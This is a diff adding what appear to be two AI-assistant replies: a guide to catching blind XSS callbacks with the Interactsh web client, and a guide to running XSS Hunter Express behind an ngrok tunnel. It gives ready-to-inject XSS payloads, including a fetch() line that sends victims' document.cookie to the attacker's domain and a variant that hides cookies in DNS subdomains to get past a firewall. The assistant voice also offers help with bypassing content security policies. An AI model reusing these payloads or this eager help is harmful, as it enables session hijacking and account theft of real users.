@@ -1,0 +1,68 @@
+To use the Interactsh Web Client, you do not need to install anything. It operates entirely within your browser to generate unique tracking addresses and catch incoming connection alerts. [1, 2] 
+## Step 1: Generate Your Unique Link
+
+   1. Open your browser and go to the official [ProjectDiscovery Interactsh Web App](https://app.interactsh.com/).
+   2. Look at the top menu bar to see your automatically generated, unique subdomain string.
+   3. Click the Copy button next to it (it will look like c123xpt20v...oast.fun or *.interact.sh). [3, 4, 5] 
+
+------------------------------
+## Step 2: Craft and Inject Your XSS Payload
+Take your unique copied address and plug it into a standard HTML payload vector. [6] 
+Basic Alert Payload:
+
+"><script src="http://YOUR_COPIED_DOMAIN"></script>
+
+Advanced Data-Stealing Payload:
+If you want to actively steal the victim's session cookies or configuration variables via the callback, append the document data straight to your URL query path: [7, 8] 
+
+"><script>fetch('http://YOUR_COPIED_DOMAIN/log?cookie='+document.cookie)</script>
+
+------------------------------
+## Step 3: Monitor Live Callbacks
+Leave the Interactsh web tab open in your browser. When the target web application runs your code, it forces the browser or server backend to call your domain. [6, 9] 
+The client interface will instantly log and parse the connection:
+
+* DNS Tab: Verifies exactly when the host looked up your tracking link.
+* HTTP Tab: Inspects the request to view Cookies, header details, custom paths, and the client browser type. [6] 
+
+------------------------------
+## Pro-Tip: Data Exfiltration via Subdomains
+If a rigid Web Application Firewall (WAF) blocks parameters or paths like /log?cookie=, you can dynamically inject leaked data directly into a subdomain lookup to extract it safely via raw DNS logs: [8, 10] 
+
+"><script>
+  var encoded = btoa(document.cookie).replace(/[^a-zA-Z0-9]/g, '');
+  var img = new Image();
+  img.src = 'http://' + encoded + '.YOUR_COPIED_DOMAIN';
+</script>
+
+When this runs, the victim's base64-encoded cookie strings will display directly inside the DNS subdomains section on your dashboard.
+Are you currently trying to bypass a strict Content Security Policy (CSP) that blocks external connections, or are you scanning for Blind SSRF links alongside your XSS testing? [7] 
+
+abang
+You need to pair ngrok with Port 80 because XSS Hunter Express expects to receive incoming web traffic over standard HTTP.
+Run this command in a separate terminal tab:
+
+ngrok http 80
+
+## How the Pairing Works
+
+[ Target Web App ] ---> (Hits Ngrok URL) ---> [ Ngrok Tunnel ] ---> [ Local Port 80 ] ---> [ Docker / XSS Hunter ]
+
+## Steps to Link Them:
+
+   1. Start Ngrok: Run ngrok http 80 and copy the public HTTPS forwarding URL (e.g., 1a2b-34-56.ngrok-free.app). Do not include https://.
+   2. Update XSS Hunter Configuration: Open your configuration file:
+   
+   nano docker-compose.yml
+   
+   3. Insert the URL: Find the HOSTNAME line and change it to match your Ngrok URL:
+   
+   HOSTNAME: 1a2b-34-56.ngrok-free.app
+   
+   4. Launch the Server: Save the file and start your container instance with administrative privileges:
+   
+   sudo docker-compose up xsshunterexpress
+   
+   
+Do you have nano open to edit the HOSTNAME field, or do you need to find where that line is located in the file?
+
